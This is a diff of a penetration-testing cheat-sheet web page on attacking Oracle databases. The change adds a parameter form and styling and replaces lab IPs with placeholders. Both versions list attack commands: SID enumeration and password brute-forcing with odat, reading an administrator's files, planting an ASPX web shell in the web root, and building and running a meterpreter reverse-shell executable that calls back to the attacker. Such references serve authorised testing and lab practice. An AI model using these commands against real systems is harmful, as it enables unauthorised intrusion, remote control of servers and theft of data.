@@ -199,8 +199,131 @@
   <li><a href="https://tldrbins.github.io/@rce/">Rce</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="tools">Tools</h3>
 <p>
 <button data-tabset="set1" data-tabcontent="tab1" class="active">sqlplus</button>
@@ -208,64 +331,65 @@
 <button data-tabset="set1" data-tabcontent="tab2" >ODAT</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Install</span>
-</span></span><span class="line"><span class="cl">sudo apt install oracle-instantclient-sqlplus
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># export LD_LIBRARY_PATH</span>
-</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/usr/lib/oracle/19.6/client64/lib<span class="si">${</span><span class="nv">LD_LIBRARY_PATH</span><span class="p">:+:</span><span class="nv">$LD_LIBRARY_PATH</span><span class="si">}</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
-</span></span><span class="line"><span class="cl">sqlplus -V
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Install
+</span></span><span class="line"><span class="cl"><span class="go">sudo apt install oracle-instantclient-sqlplus
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> <span class="nb">export</span> LD_LIBRARY_PATH
+</span></span><span class="line"><span class="cl"><span class="go">export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">sqlplus -V
+</span></span></span></code></pre></div></div>
 </div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Install</span>
-</span></span><span class="line"><span class="cl">sudo apt install odat
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
-</span></span><span class="line"><span class="cl">odat --version
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Install
+</span></span><span class="line"><span class="cl"><span class="go">sudo apt install odat
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">odat --version
+</span></span></span></code></pre></div></div>
 <p><small><em>Ref: <a href="https://github.com/quentinhardy/odat">Download ODAT</a></em></small></p></div></p>
 <br>
 <hr>
 <h3 id="enum">Enum</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># SID enum (You only need one)</span>
-</span></span><span class="line"><span class="cl">odat sidguesser -s 10.10.11.10
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># User/Password brute force</span>
-</span></span><span class="line"><span class="cl">odat passwordguesser -s 10.10.11.10 -d &lt;SID&gt; --accounts-file accounts.txt
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Run all checks with creds as sysdba</span>
-</span></span><span class="line"><span class="cl">odat all -s 10.10.11.10 -U &lt;USER&gt; -P &lt;PASSWORD&gt; -d &lt;SID&gt; --sysdba
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> SID enum <span class="o">(</span>You only need one<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">odat sidguesser -s &lt;TARGET&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> User/Password brute force
+</span></span><span class="line"><span class="cl"><span class="go">odat passwordguesser -s &lt;TARGET&gt; -d &lt;SID&gt; --accounts-file accounts.txt
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run all checks with creds as sysdba
+</span></span><span class="line"><span class="cl"><span class="go">odat all -s &lt;TARGET&gt; -U &lt;USER&gt; -P &#39;&lt;PASSWORD&gt;&#39; -d &lt;SID&gt; --sysdba
+</span></span></span></code></pre></div></div>
 <h3 id="general">General</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Export everytime or add to ~/.zshrc</span>
-</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/usr/lib/oracle/19.6/client64/lib<span class="si">${</span><span class="nv">LD_LIBRARY_PATH</span><span class="p">:+:</span><span class="nv">$LD_LIBRARY_PATH</span><span class="si">}</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Connect</span>
-</span></span><span class="line"><span class="cl">sqlplus &lt;USER&gt;/&lt;PASSWORD&gt;@10.10.11.10:1521/&lt;SID&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Connect as sysdba (sudo)</span>
-</span></span><span class="line"><span class="cl">sqlplus &lt;USER&gt;/&lt;PASSWORD&gt;@10.10.11.10:1521/&lt;SID&gt; as sysdba
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check privilege</span>
-</span></span><span class="line"><span class="cl"><span class="k">select</span> * from user_role_privs<span class="p">;</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Export everytime or add to ~/.zshrc
+</span></span><span class="line"><span class="cl"><span class="go">export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Connect
+</span></span><span class="line"><span class="cl"><span class="go">sqlplus &#39;&lt;USER&gt;/&lt;PASSWORD&gt;@&lt;TARGET&gt;:1521/&lt;SID&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Connect as sysdba <span class="o">(</span>sudo<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">sqlplus &#39;&lt;USER&gt;/&lt;PASSWORD&gt;@&lt;TARGET&gt;:1521/&lt;SID&gt;&#39; as sysdba
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check privilege
+</span></span><span class="line"><span class="cl"><span class="go">select * from user_role_privs;
+</span></span></span></code></pre></div></div>
 <br>
 <hr>
 <h4 id="arbitrary-read">Arbitrary Read</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">odat ctxsys -s 10.10.11.10 -U &lt;USER&gt; -P &lt;PASSWORD&gt; -d &lt;SID&gt; --sysdba --getFile c:<span class="se">\\</span>users<span class="se">\\</span>administrator<span class="se">\\</span>desktop<span class="se">\\</span>file.txt
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">odat ctxsys -s &lt;TARGET&gt; -U &lt;USER&gt; -P &#39;&lt;PASSWORD&gt;&#39; -d &lt;SID&gt; --sysdba --getFile c:\\users\\administrator\\desktop\\file.txt
+</span></span></span></code></pre></div></div>
 <h4 id="upload-file-to-rce">Upload File to RCE</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">odat dbmsadvisor -s 10.10.11.10 -U &lt;USER&gt; -P &lt;PASSWORD&gt; -d &lt;SID&gt; --sysdba --putFile C:<span class="se">\\</span>inetpub<span class="se">\\</span>wwwroot cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">odat dbmsadvisor -s &lt;TARGET&gt; -U &lt;USER&gt; -P &#39;&lt;PASSWORD&gt;&#39; -d &lt;SID&gt; --sysdba --putFile C:\\inetpub\\wwwroot cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx
+</span></span></span></code></pre></div></div>
 <h4 id="execute-binary-to-rce">Execute binary to RCE</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create a malicious exe</span>
-</span></span><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f exe -o revshell.exe
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Upload</span>
-</span></span><span class="line"><span class="cl">odat utlfile -s 10.10.11.10 -U &lt;USER&gt; -P &lt;PASSWORD&gt; -d &lt;SID&gt; --sysdba --putFile <span class="se">\\</span>Temp revshell.exe revshell.exe
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Execute</span>
-</span></span><span class="line"><span class="cl">odat externaltable -s 10.10.11.10 -U &lt;USER&gt; -P &lt;PASSWORD&gt; -d &lt;SID&gt; --sysdba --exec <span class="se">\\</span>Temp revshell.exe
-</span></span></code></pre></div></div>
-<br></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Create a malicious exe
+</span></span><span class="line"><span class="cl"><span class="go">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;LOCAL_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -f exe -o revshell.exe
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Upload
+</span></span><span class="line"><span class="cl"><span class="go">odat utlfile -s &lt;TARGET&gt; -U &lt;USER&gt; -P &#39;&lt;PASSWORD&gt;&#39; -d &lt;SID&gt; --sysdba --putFile \\Temp revshell.exe revshell.exe
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Execute
+</span></span><span class="line"><span class="cl"><span class="go">odat externaltable -s &lt;TARGET&gt; -U &lt;USER&gt; -P &#39;&lt;PASSWORD&gt;&#39; -d &lt;SID&gt; --sysdba --exec \\Temp revshell.exe
+</span></span></span></code></pre></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
